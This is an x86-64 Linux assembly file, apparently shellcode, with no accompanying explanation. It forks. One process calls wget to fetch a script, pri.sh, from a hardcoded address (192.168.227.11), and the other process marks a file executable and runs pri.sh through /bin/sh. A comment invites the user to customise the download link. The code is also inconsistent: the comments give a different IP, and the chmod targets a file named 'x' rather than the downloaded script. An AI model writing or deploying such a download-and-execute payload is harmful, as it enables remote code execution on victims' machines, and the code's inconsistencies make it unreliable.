 global _start
    section .text
    _start:
    
    ;fork
    xor rax,rax
    add rax,57
    syscall
    
    xor rdi,rdi
    xor r12,r12
     
    mov r12,rax ;pid
    cmp rax,rdi
     
    jz wget
    
    ;wait(NULL)
    xor r10,r10 ;null
    xor rdx,rdx ;null
    mov rsi,r10 ;status
    mov rdi,r12 ;pid
     
    xor rax,rax
    mov al,61
    syscall
     
    
    
    ;chmod x
    xor rdx,rdx
    mov si,0x1ff
    push 0x78
    mov rdi, rsp
    xor rax, rax
    mov al, 0x5a
    syscall
    
    ;exec x
    xor rax,rax
    xor rdx,rdx
    push rax
    push rax
     
     
    mov [rsp],dword '//bi'
    mov [rsp+4],dword 'n/sh'
     
     
    mov rdi,rsp
     
     
    push rax
    push rax 
     
    mov [rsp],dword 'pri'
    mov [rsp+3],word '.s'
    mov [rsp+5],byte 'h'
    mov rsi,rsp
     
    push rdx
    push rsi
    push rdi
     
    mov rsi,rsp
     
    add rax,59
    syscall
    ;--------
    ;close(fd)
     
    push r9
    pop rdi
     
    push 3
    pop rax
    syscall
    
    wget:
    
    ;download 192.168.227.11//x with wget
    
    ;execve("/usr/bin//wget",{"/usr/bin//wget","http ://1 92.1 68.3 0.12 9/pr i.sh","-O",".pri.sh",NULL},NULL)
     
    xor rax,rax
     
     
    push rax
    push rax
    push rax
     
    mov [rsp],dword '/usr'
    mov [rsp+4],dword '/bin'
    mov [rsp+8],dword '//wg'
    mov [rsp+12],word 'et'
     
    mov rdi,rsp
     
    push rax
    push rax
    push rax
    push rax
     
    ;----------------------
    ;cusmizetd these statements for the link of pri.sh
    mov [rsp],dword 'http'
    mov [rsp+4],dword '://1'
    mov [rsp+8],dword '92.1'
    mov [rsp+12],dword '68.2'
    mov [rsp+16],dword '27.1'
    mov [rsp+20],dword '1/pr'
    mov [rsp+24],dword 'i.sh'
    ;------------------------
     
    mov rsi,rsp
    xor rdx,rdx
     
    push rax
	push rax
    push rax
    push rax
    push rax
    push rax
    push rax
     
    mov [rsp],word '-O'
    mov rcx,rsp

    push rax
    push rax
    mov [rsp],dword 'pri'
    mov [rsp+3],word '.s'
    mov [rsp+5],byte 'h'
     
    mov r15,rsp

    push rdx

    push r15
    push rcx
    push rsi

    push rdi
     
    mov rsi,rsp
     
    mov al,59
    syscall